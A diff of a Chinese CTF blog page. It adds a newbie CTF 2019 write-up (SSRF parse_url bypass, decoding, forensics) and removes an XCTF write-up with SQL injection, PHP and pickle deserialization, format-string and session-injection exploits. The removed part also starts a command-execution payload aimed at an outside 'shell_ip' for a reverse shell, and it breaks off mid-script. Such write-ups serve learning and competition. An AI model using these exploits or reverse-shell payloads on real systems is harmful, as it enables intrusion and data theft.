@@ -66,6 +66,136 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-nbctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/04/20/nbctf/" class="article-date">
+  <time class="dt-published" datetime="2020-04-20T12:49:27.394Z" itemprop="datePublished">2020-04-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/04/20/nbctf/">newbie ctf 2019</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="newbie-ctf-2019"><a href="#newbie-ctf-2019" class="headerlink" title="newbie ctf 2019"></a>newbie ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="normal-host"><a href="#normal-host" class="headerlink" title="normal_host"></a>normal_host</h3><p>题目描述:</p>
+<blockquote>
+<p>You can get flag in “normalflag.iwinv.net”</p>
+</blockquote>
+<p>题目给的链接</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kogjizorj30ue0gvngf.jpg" alt="image.png"></p>
+<p>直接访问 flag</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kofgp0d7j312909paar.jpg" alt="image.png"></p>
+<p>输入网站测试发现,会在网址后面加个secret参数</p>
+<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191103111420354.png" alt="image-20191103111420354"></p>
+<p>而flag界面就是通过这个secret来识别是否通过internal.iwinv.net</p>
+<p>观察secret发现，每次访问给出的secret都不一样</p>
+<p>排除掉算出secret的做法,那么接下来就是要绕过禁用host的限制或者是输入一个网址，让其无法识别出是<code>normalflag.iwinv.net</code>却能访问<code>normalflag.iwinv.net</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kolppcsfj30g3045748.jpg" alt="image.png"></p>
+<p>这就很容易想到php里面libcurl和parase的差异</p>
+<blockquote>
+<p>parse_url与libcurl对与url的解析差异可能导致ssrf当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对<a href="http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com" target="_blank" rel="noopener">http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</a> </p>
+<p>from  <a href="https://paper.seebug.org/561" target="_blank" rel="noopener">https://paper.seebug.org/561</a> </p>
+</blockquote>
+<p>构造url:<code>user@4399.com@normalflag.iwinv.net</code>(我是来帮4399打广告的:v:)​</p>
+<p>KorNewbie{H0$7_$P1it_A774cK_U$3s_N0RM^liZ47ioN&amp;##$%%!}</p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="catch-me"><a href="#catch-me" class="headerlink" title="catch me"></a>catch me</h3><p>利用工具逐帧查看，把每个子出现的位置记录转成ascii码得到flag</p>
+<p>KorNewbie{w0w_e4g1e_3y3}</p>
+<h3 id="BiMilCode"><a href="#BiMilCode" class="headerlink" title="BiMilCode"></a>BiMilCode</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8kovw3cl4j30e704pt8u.jpg" alt="image.png"></p>
+<p>刚开始题目说要encode。结果被这个误解搞了一个小时才发现是decode</p>
+<p>观察发现一个字符会被编码成2位的16进制的数据</p>
+<p>认真观察发现编码方式还和位置有关，但是相同的位置编码方式相同,而且只是对ascii码进行移位</p>
+<p>也就是说,在同一个会话里,我们可以通过ascii码的差值来得到来计算出题目给出的编码后的字符串</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kp8m10vej30ep058jrl.jpg" alt="image.png"></p>
+<pre><code class="python">s2=&#39;45 dd 97 38 62 6c 62 85&#39;.split(&#39; &#39;)
+s1=&#39;3a 93 78 3a 6c 63 3a 63&#39;.split(&#39; &#39;)
+print(s1)
+print(s2)
+for i in range(len(s1)):
+    print(chr(ord(&#39;0&#39;)+int(s1[i],16)-int(s2[i],16)),end=&#39;&#39;)</code></pre>
+<p>KorNewbie{Nace_I_believed_it}</p>
+<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="find-the-plain"><a href="#find-the-plain" class="headerlink" title="find the plain"></a>find the plain</h3><p>题目描述</p>
+<blockquote>
+<p>Alpha team’s whistleblower captured a packet that leaked internal information to the outside using ftp internal confidential data.</p>
+<p>Analyze the packet and flag the password and information obtained for the ftp connection!</p>
+<p>flag format : KorNewbie{password_yougetinformation}</p>
+<p>※ If there is a hash value, it will be md5.</p>
+</blockquote>
+<p>用<code>(!frame.len== 1518) &amp;&amp;(!frame.len== 1514)&amp;&amp; (! ip.addr==192.229.232.240) &amp;&amp; (not tcp.stream==2) &amp;&amp; (not tcp.stream==0)&amp;&amp; (not tcp.stream==1)</code></p>
+<p>过滤找到ftp传输文件和账号密码</p>
+<p>password:root</p>
+<p>badguy.txt</p>
+<pre><code>7J2067O06rKMIOyVjO2MjO2MgOydmCDsi6Dsg4HsoJXrs7TripQg67CR7J2YIOyjvOyGjOyXkCDrqqjrkZAg64u07JWE64aT7JWY64SkLiDqsbTtiKzrpbwg67mM7KeA7JuM7YSwLi4gDQpodHRwczovL3Bhc3RlYmluLmNvbS83MHlER2lSUw==</code></pre><p>decode得到</p>
+<pre><code>이보게 알파팀의 신상정보는 밑의 주소에 모두 담아놓았네. 건투를 빌지워터.. 
+//alpha组的个人信息全部放在下面的地址里。祝你成功..
+https://pastebin.com/70yDGiRS</code></pre><p><code>k459iki6m5j094m2lmkhjmi9527l81ml</code></p>
+<p>题目提示得到的一个信息是md5</p>
+<p>所以对这个进行凯撒密码解密得到<code>d459bdb6f5c094f2efdacfb9527e81fe</code></p>
+<p>后面发现<img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k0vd6qapj30ue015gli.jpg" alt="image.png"></p>
+<p>这里也提示了凯撒加密</p>
+<p>但是用国内的md5解密网站无论如何也破不了</p>
+<p>用朝鲜语搜了一下就解密了</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8k0ww99j0j30j6036t8w.jpg" alt="image.png"></p>
+<p>KorNewbie{root_IronDragon}</p>
+<p>………………………</p>
+<p>这是个梗吗.</p>
+<h3 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h3><p>题目描述</p>
+<blockquote>
+<p>Confidential information came and went through chat. Find the email of the user who used the chat. </p>
+</blockquote>
+<p>user:NewbieCTF2019</p>
+<p>在youtube找到一个好玩的重置密码的方法</p>
+<p> <a href="https://www.youtube.com/watch?v=YBFAzK9mgNI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=YBFAzK9mgNI</a> </p>
+<p>根据这个来重置密码</p>
+<p>重置密码后看着棒子文我是懵逼的(同伴+1)</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kph085tzj31gw0see6k.jpg" alt="image.png"></p>
+<p>根据题目提示聊天软件理所当然的盯上了kakao</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kppnap1sj30wj0b60u7.jpg" alt="image.png"></p>
+<p>跑到文件夹里翻一翻(也可以写个脚本/fad)</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kpqxb2njj30tz0j8my5.jpg" alt="image.png"></p>
+<p>最后拿到flag</p>
+<p><code>KorNewbie{renek@it-simple.net}</code></p>
+<h3 id="rec"><a href="#rec" class="headerlink" title="rec"></a>rec</h3><p>这题跟进去调试也没看到啥，想来想去防止取证题的地方怎么也不可能是逆向啥的、</p>
+<p>于是就开始用binwalk,strings…..</p>
+<p>最后翻一翻找到了seg段…………</p>
+<p>在seg段找到</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k2xe25wlj30io0gbdio.jpg" alt="image.png"></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/nbctf/">http://blog.ccreater.top/2020/04/20/nbctf/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/04/20/nbctf/" data-id="cka3ckr33002yv4v0ebst1y7k" data-title="newbie ctf 2019" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-2019xman个人排位赛wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" class="article-date">
@@ -2241,609 +2371,6 @@ echo &quot;install success&quot;
 
 
   
-    <article id="post-xctf高校抗疫" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/03/10/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/" class="article-date">
-  <time class="dt-published" datetime="2020-03-10T05:06:23.513Z" itemprop="datePublished">2020-03-10</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/03/10/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/">xctf高校抗疫</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="高校战疫"><a href="#高校战疫" class="headerlink" title="高校战疫"></a>高校战疫</h1><p>打完这次比赛,我再次认清了自己是个卑微的递茶小弟…</p>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a><strong>easy_trick_gzmtu</strong></h3><pre><code>2020\\%27 200
-2020%27 500
-2020\%27 500</code></pre><p>可能作为格式化字符串或者过滤<code>\</code> ?,继续测试</p>
-<pre><code>http://121.37.181.246:6333/?time=2020&#39; or 1%23  =&gt;500
-http://121.37.181.246:6333/?time=2020or&#39;%23 =&gt;无结果,说明不是过滤or
-http://121.37.181.246:6333/?time=2020&#39;%23or=&gt;没有500,说明or不在黑名单中 
-</code></pre><pre><code>/?time=2020%27%20||1=1%20--+    返回正确结果
-/?time=2020%27%20or1=1%20--+   and   &amp;&amp;都页面报错
-/?time=-1%27%20||1=0%20--+   页面的hello world消失，应该存在布尔盲注</code></pre><pre><code>?time=0&#39;||\i\f(\s\l\e\e\p(2),1,1)%23
-成功执行,说明是过滤\</code></pre><pre><code class="python">import requests,re
-sql=&quot;union select 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata&quot;
-#sql=&quot;union select 1,GROUP_CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,passwd,&#39;,&#39;,url,&#39;,&#39;),3 FROM admin&quot;
-#admin,content
-#admin
-#id,username,passwd,url
-#0,admin,20200202goodluck,/eGlhb2xldW5n,
-tmp=&quot;&quot;
-for i in sql:
-    if i.isalpha():
-        tmp+=&quot;\\&quot;+i
-        #print(&quot;\\&quot;+i,end=&quot;&quot;)
-    else:
-        tmp+=i
-        #print(i,end=&quot;&quot;)
-
-tmp=&quot;http://121.37.181.246:6333/?time=0&#39;+{}%23&quot;.format(tmp)
-res=requests.get(tmp)
-result=re.search(r&#39;&lt;div class=&quot;text-c &quot;&gt;(.*)&lt;/div&gt;&#39;,res.text)
-print(result.group(1))</code></pre>
-<p>拿到后台地址和管理员账号</p>
-<pre><code>http://121.37.181.246:6333/eGlhb2xldW5n
-admin,20200202goodluck</code></pre><pre><code>http://121.37.181.246:6333/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php
-http://121.37.181.246:6333/eGlhb2xldW5n/check.php
-http://121.37.181.246:6333/eGlhb2xldW5n/index.php
-</code></pre><p>php版本5.5.9,%00截断</p>
-<p>check.php中可以读取文件但是需要本地访问</p>
-<pre><code>Host: 127.0.0.1
-X-Forwarded-For: 127.0.0.1
-Client-Ip: 127.0.0.1
-Referer: http://127.0.0.1/eGlhb2xldW5n/check.php</code></pre><pre><code>没有用
-eGlhb2xldW5nLnBocA==:xiaoleung.php
-eGlhb2xldW5n:xiaoleung
-注释里给的:eGlhb2xldW5nLnBocA==.php
-可能是突破的关键,但是里面啥都没有
-对eGlhb2xldW5nLnBocA==.php进行参数爆破,也没结果
-</code></pre><p>存在http请求走私</p>
-<pre><code>GET /eGlhb2xldW5n/check.php?url=fuck&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1
-Host: 121.37.181.246:6333
-X-Forwarded-For: 127.0.0.1
-Client-Ip: 127.0.0.1
-Cookie: PHPSESSID=9gkhjmmmp6ctmnn2578n3hcth1
-
-GET /eGlhb2xldW5n/check.php?url=fuck&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1
-Host: localhost
-X-Forwarded-For: 127.0.0.1
-Client-Ip: 127.0.0.1
-Cookie: PHPSESSID=9gkhjmmmp6ctmnn2578n3hcth1
-
-</code></pre><p>最后学长跟我说这里本地访问的意思是url中的ip地址要为127.0.0.1……..无语</p>
-<p>GET /eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</p>
-<pre><code class="php">&lt;?php
-
-class trick{
-    public $gf;
-    public function content_to_file($content){    
-        $passwd = $_GET[&#39;pass&#39;];
-        if(preg_match(&#39;/^[a-z]+\.passwd$/m&#39;,$passwd)) 
-    { 
-
-        if(strpos($passwd,&quot;20200202&quot;)){
-            echo file_get_contents(&quot;/&quot;.$content);
-
-        }
-
-         } 
-        }
-    public function aiisc_to_chr($number){
-        if(strlen($number)&gt;2){
-        $str = &quot;&quot;;
-         $number = str_split($number,2);
-         foreach ($number as $num ) {
-             $str = $str .chr($num);
-         }
-         return strtolower($str);
-        }
-        return chr($number);
-    }
-    public function calc(){
-        $gf=$this-&gt;gf;
-        if(!preg_match(&#39;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#39;, $gf)){
-              eval(&#39;$content=&#39;.$gf.&#39;;&#39;);
-              $content =  $this-&gt;aiisc_to_chr($content); 
-              return $content;
-        }
-    }
-    public function __destruct(){
-        $this-&gt;content_to_file($this-&gt;calc());
-
-    }
-
-}
-unserialize((base64_decode($_GET[&#39;code&#39;])));
-
-?&gt;</code></pre>
-<p>我们要逻辑运算符非来绕过<code>preg_match(&#39;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#39;, $gf)</code></p>
-<pre><code class="http">GET /eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php?pass=aaa.passwd%0a20200202&amp;code=Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoxMToifiLIz8jJycrIziIiO30%3DD HTTP/1.1</code></pre>
-<h3 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h3><pre><code class="python">import base64
-import io
-import sys
-import pickle
-
-from flask import Flask, Response, render_template, request
-import secret
-
-
-app = Flask(__name__)
-
-
-class Animal:
-    def __init__(self, name, category):
-        self.name = name
-        self.category = category
-
-    def __repr__(self):
-        return f&#39;Animal(name={self.name!r}, category={self.category!r})&#39;
-
-    def __eq__(self, other):
-        return type(other) is Animal and self.name == other.name and self.category == other.category
-
-
-class RestrictedUnpickler(pickle.Unpickler):
-    def find_class(self, module, name):
-        if module == &#39;__main__&#39;:
-            return getattr(sys.modules[&#39;__main__&#39;], name)
-        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))
-
-
-def restricted_loads(s):
-    return RestrictedUnpickler(io.BytesIO(s)).load()
-
-
-def read(filename, encoding=&#39;utf-8&#39;):
-    with open(filename, &#39;r&#39;, encoding=encoding) as fin:
-        return fin.read()
-
-
-@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
-def index():
-    if request.args.get(&#39;source&#39;):
-        return Response(read(__file__), mimetype=&#39;text/plain&#39;)
-
-    if request.method == &#39;POST&#39;:
-        try:
-            pickle_data = request.form.get(&#39;data&#39;)
-            if b&#39;R&#39; in base64.b64decode(pickle_data):
-                return &#39;No... I don\&#39;t like R-things. No Rabits, Rats, Roosters or RCEs.&#39;
-            else:
-                result = restricted_loads(base64.b64decode(pickle_data))
-                if type(result) is not Animal:
-                    return &#39;Are you sure that is an animal???&#39;
-            correct = (result == Animal(secret.name, secret.category))
-            return render_template(&#39;unpickle_result.html&#39;, result=result, pickle_data=pickle_data, giveflag=correct)
-        except Exception as e:
-            print(repr(e))
-            return &quot;Something wrong&quot;
-
-    sample_obj = Animal(&#39;一给我哩giaogiao&#39;, &#39;Giao&#39;)
-    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()
-    return render_template(&#39;unpickle_page.html&#39;, sample_obj=sample_obj, pickle_data=pickle_data)
-
-
-if __name__ == &#39;__main__&#39;:
-    app.run(host=&#39;0.0.0.0&#39;, port=5000)</code></pre>
-<p>我们可以控制反序列化的内容</p>
-<p>但是反序列化还有限制:</p>
-<pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):
-    def find_class(self, module, name):
-        if module == &#39;__main__&#39;:
-            return getattr(sys.modules[&#39;__main__&#39;], name)
-        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))
-
-
-def restricted_loads(s):
-    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre>
-<p>只能再<code>__main__</code>中寻找属性,这样我们也就无法直接读取secret里的内容了</p>
-<p>关键:</p>
-<p><code>return render_template(&#39;unpickle_result.html&#39;, result=result, pickle_data=pickle_data, giveflag=correct)</code></p>
-<p>不知道是<code>correct!=False</code>给flag还是<code>correct==True</code>给flag</p>
-<p>决定correct的是:<code>correct = (result == Animal(secret.name, secret.category))</code></p>
-<p>会调用<code>Animal的__eq__</code>我们可以令<code>__eq__</code>等于其他的函数来绕过,但是没有找到合适的两个参数的函数</p>
-<p>后来发现<code>Animal(secret.name, secret.category)</code>是在反序列化之后执行的,如果我们可以修改secret,那么我们就可以控制结果</p>
-<p>payload:</p>
-<pre><code class="python">import pickle
-import base64
-p=b&#39;&#39;&#39;c__main__
-secret
-(S&#39;name&#39;
-S&#39;test&#39;
-S&#39;category&#39;
-S&#39;test&#39;
-db&#39;&#39;&#39;+pickle.loads(Animal(&quot;test&quot;,&quot;test&quot;))
-print(base64.b64encode(p))</code></pre>
-<p><code>flag{409ed945-5b77-4ec3-97e1-b395778842ba}</code></p>
-<h3 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h3><p>begin 那里搞个 %s% 就行了。</p>
-<p>8080 出东西了</p>
-<pre><code>Welcome to our FMKQ api, you could use the help information below
-To read file:
-    /read/file=example&amp;vipcode=example
-    if you are not vip,let vipcode=0,and you can only read /tmp/{file}
-Other functions only for the vip!!!</code></pre><pre><code>http://121.37.179.47:1101/?begin=%s%&amp;head=\&amp;url=http://127.0.0.1:8080/read/file=/tmp/flag%26vipcode=1</code></pre><p>flag在 /未知目录/flag。至少能扫目录，或者直接 getshell</p>
-<p><img src="https://i.loli.net/2020/03/08/qlPynLj3IOkZu9A.png" alt="image7052"></p>
-<p>在fuzz过程中有一下报错</p>
-<pre><code>Absolute URI not allowed if server is not a proxy.
-Malformed Request-Line: bad protocol
-Malformed Request-URI</code></pre><p>去网上查了下可能是cherrypy</p>
-<p>当输入{file}时,其对应的输出为:error,说明可能有ssti或者格式化字符串漏洞</p>
-<p>利用格式化字符串读取vipcode,从而任意文件读取</p>
-<pre><code>{file.__class__.__init__.__globals__}
-[&#39;lib&#39;, &#39;media&#39;, &#39;opt&#39;, &#39;var&#39;, &#39;usr&#39;, &#39;mnt&#39;, &#39;bin&#39;, &#39;root&#39;, &#39;home&#39;, &#39;tmp&#39;, &#39;boot&#39;, &#39;sys&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;lib64&#39;, &#39;etc&#39;, &#39;dev&#39;, &#39;proc&#39;, &#39;app&#39;, &#39;.dockerenv&#39;, &#39;fl4g_1s_h3re_u_wi11_rua&#39;]
-
-{&#39;truevipcode&#39;: &#39;3Ad8fya45bYeUOFDkJuXpjV1tGHLxzonrCWlER2mPKS9i67w&#39;}
-&#39;__file__&#39;: &#39;/app/base/readfile.py&#39;
-
-</code></pre><pre><code>/?head=\&amp;url=http://127.0.0.1:8080/read/file=/etc/passwd%26vipcode=3Ad8fya45bYeUOFDkJuXpjV1tGHLxzonrCWlER2mPKS9i67w&amp;begin=%s%</code></pre><p>vip.py</p>
-<pre><code class="python">
-import random
-import string
-
-
-vipcode = &#39;&#39;
-
-
-class vip:
-    def __init__(self):
-        global vipcode
-        if vipcode == &#39;&#39;:
-            vipcode = &#39;&#39;.join(random.sample(string.ascii_letters+string.digits, 48))
-            self.truevipcode = vipcode
-        else:
-            self.truevipcode = vipcode
-
-    def GetCode(self):
-        return self.truevipcode</code></pre>
-<p>readfile.py</p>
-<pre><code class="python">from .vip import vip
-import re
-import os
-
-
-class File:
-    def __init__(self,file):
-        self.file = file
-
-    def __str__(self):
-        return self.file
-
-    def GetName(self):
-        return self.file
-
-
-class readfile():
-
-    def __str__(self):
-        filename = self.GetFileName()
-        if &#39;..&#39; in filename or &#39;proc&#39; in filename:
-            return &quot;quanbumuda&quot;
-        else:
-            try:
-                file = open(&quot;/tmp/&quot; + filename, &#39;r&#39;)
-                content = file.read()
-                file.close()
-                return content
-            except:
-                return &quot;error&quot;
-
-    def __init__(self, data):
-        if re.match(r&#39;file=.*?&amp;vipcode=.*?&#39;,data) != None:
-            data = data.split(&#39;&amp;&#39;)
-            data = {
-                data[0].split(&#39;=&#39;)[0]: data[0].split(&#39;=&#39;)[1],
-                data[1].split(&#39;=&#39;)[0]: data[1].split(&#39;=&#39;)[1]
-            }
-            if &#39;file&#39; in data.keys():
-                self.file = File(data[&#39;file&#39;])
-
-            if &#39;vipcode&#39; in data.keys():
-                self.vipcode = data[&#39;vipcode&#39;]
-            self.vip = vip()
-
-
-    def test(self):
-        if &#39;file&#39; not in dir(self) or &#39;vipcode&#39; not in dir(self) or &#39;vip&#39; not in dir(self):
-            return False
-        else:
-            return True
-
-    def isvip(self):
-        if self.vipcode == self.vip.GetCode():
-            return True
-        else:
-            return False
-
-    def GetFileName(self):
-        return self.file.GetName()
-
-
-current_folder_file = []
-
-
-class vipreadfile():
-    def __init__(self,readfile):
-        self.filename = readfile.GetFileName()
-        self.path = os.path.dirname(os.path.abspath(self.filename))
-        self.file = File(os.path.basename(os.path.abspath(self.filename)))
-        global current_folder_file
-        try:
-            current_folder_file = os.listdir(self.path)
-        except:
-            current_folder_file = current_folder_file
-
-    def __str__(self):
-        if &#39;fl4g&#39; in self.path:
-            return &#39;nonono,this folder is a secret!!!&#39;
-        else:
-            output = &#39;&#39;&#39;Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n&#39;&#39;&#39;
-            filepath = (self.path + &#39;/{vipfile}&#39;).format(vipfile=self.file)
-            output += filepath
-            output += &#39;\r\n\r\nThe content is:\r\n&#39;
-            try:
-                f = open(filepath,&#39;r&#39;)
-                content = f.read()
-                f.close()
-            except:
-                content = &#39;can\&#39;t read&#39;
-            output += content
-            output += &#39;\r\n\r\nOther files under the same folder:\r\n&#39;
-            output += &#39; &#39;.join(current_folder_file)
-            return output</code></pre>
-<p>app.py</p>
-<pre><code class="python">import web
-from urllib.parse import unquote
-from base.readfile import *
-
-urls = (
-    &#39;/&#39;, &#39;help&#39;,
-    &#39;/read/(.*)&#39;,&#39;read&#39;
-)
-web.config.debug = False
-
-class help:
-    def GET(self):
-        help_information = &#39;&#39;&#39;
-        Welcome to our FMKQ api, you could use the help information below
-        To read file:
-            /read/file=example&amp;vipcode=example
-            if you are not vip,let vipcode=0,and you can only read /tmp/{file}
-        Other functions only for the vip!!!
-        &#39;&#39;&#39;
-        return help_information
-
-
-class read:
-    def GET(self,text):
-        file2read = readfile(text)
-        if file2read.test() == False:
-            return &quot;error&quot;
-        else:
-            if file2read.isvip() == False:
-                return (&quot;The content of &quot;+ file2read.GetFileName() +&quot; is {file}&quot;).format(file=file2read)
-            else:
-                vipfile2read = vipreadfile(file2read)
-                return (str(vipfile2read))
-
-
-
-
-
-
-if __name__ == &quot;__main__&quot;:
-    app = web.application(urls, globals())
-    app.run()</code></pre>
-<p>fl4g被过滤了,所以无法直接读flag</p>
-<p>刚开始是想用fd/cwd来读取的,后来fuzz几下服务就炸掉了,所以我们换了个思路</p>
-<p>通过拼接来绕过</p>
-<pre><code>f{vipfile.__class__.__mro__[1].__new__.__doc__[39]}4g_1s_h3re_u_wi11_rua/flag
-</code></pre><p>flag{qoSF2nKvwoGRI7aJ}</p>
-<h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><p>session引擎设置错误导致的反序列化</p>
-<p><code>profile.php</code>处的<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p>
-<p>其他地方基本都是<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code></p>
-<p>我们利用sign参数来写入恶意session</p>
-<p>浏览代码发现,这里是我们的目的</p>
-<pre><code class="php">&lt;?php
-require_once(&#39;./init.php&#39;);
-error_reporting(0);
-if (check_session($_SESSION)) {
-    #变成管理员吧，奥利给
-} else {
-    die(&#39;只有管理员才能看到我哟&#39;);
-}
-
-function check_session($session)
-{
-    foreach ($session as $keys =&gt; $values) {
-        foreach ($values as $key =&gt; $value) {
-            if ($key === &#39;admin&#39; &amp;&amp; $value === 1) {
-                return true;
-            }
-        }
-    }
-    return false;
-}</code></pre>
-<p>我们最终要构造</p>
-<pre><code class="php">array(
-    &#39;xxxx&#39;:array(&#39;admin&#39;,1)
-);</code></pre>
-<p>原本我们直接在<code>upload_sign.php</code>中post : <code>sigh[admin]=1</code>即可</p>
-<p>但是<code>upload_sign.php</code>的session引擎是<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code></p>
-<p>而<code>core/index.php</code>的session引擎是:<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p>
-<p>也就是说session是无法被正确解析的</p>
-<blockquote>
-<ul>
-<li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
-<li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li>
-</ul>
-</blockquote>
-<p>根据php和php_serialize两个反序列化引擎的不同之处,我们构造</p>
-<p><code>sign=|a%3A1%3A%7Bs%3A5%3A%22admin%22%3Bi%3A1%3B%7D</code></p>
-<p>拿到</p>
-<pre><code class="php">require_once(&#39;./init.php&#39;);
-error_reporting(0);
-if (check_session($_SESSION)) {
-    #hint : core/clear.php
-    $sandbox = &#39;./sandbox/&#39; . md5(&quot;Mrk@1xI^&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
-    echo $sandbox;
-    @mkdir($sandbox);
-    @chdir($sandbox);
-    if (isset($_POST[&#39;url&#39;])) {
-        $url = $_POST[&#39;url&#39;];
-        if (filter_var($url, FILTER_VALIDATE_URL)) {
-            if (preg_match(&#39;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#39;, $url)) {
-                echo &quot;you are hacker&quot;;
-            } else {
-                $res = parse_url($url);
-                if (preg_match(&#39;/127\.0\.0\.1$/&#39;, $res[&#39;host&#39;])) {
-                    $code = file_get_contents($url);
-                    if (strlen($code) &lt;= 4) {
-                        @exec($code);
-                    } else {
-                        echo &quot;try again&quot;;
-                    }
-                }
-            }
-        } else {
-            echo &quot;invalid url&quot;;
-        }
-    } else {
-        highlight_file(__FILE__);
-    }
-} else {
-    die(&#39;只有管理员才能看到我哟&#39;);
-}</code></pre>
-<p>用<code>compress.zlib://data:@127.0.0.1/plain;base64,xxx</code>来代替data协议</p>
-<pre><code class="python">
-import random,base64,requests
-import time
-shell_ip = &#39;39.108.164.219&#39;
-
-
-
-# 将shell_IP转换成十六进制
-ip = &#39;0x&#39; + &#39;&#39;.join([str(hex(int(i))[2:].zfill(2))
-                     for i in shell_ip.split(&#39;.&#39;)])
-
-# payload某些位置的可选字符
-pos0 = &#39;f&#39;
-pos1 = &#39;k&#39;
-pos2 = &#39;g&#39;  # 随意选择字符
-
-payload = [
-    &#39;&gt;dir&#39;,
-    # 创建名为 dir 的文件
-
-    &#39;&gt;%s\\&gt;&#39; % pos0,
